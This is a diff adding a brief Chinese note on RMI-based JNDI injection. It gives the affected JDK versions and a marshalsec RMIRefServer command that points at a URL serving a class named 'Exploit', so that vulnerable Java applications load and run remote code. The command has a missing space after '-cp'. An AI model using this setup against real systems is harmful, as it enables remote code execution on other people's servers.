@@ -1,0 +1,9 @@
+基于rmi的利用方式
+
+适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。
+
+利用方式：
+
+java -cpmarshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
+
+http://127.0.0.1:8080/test/#Exploit
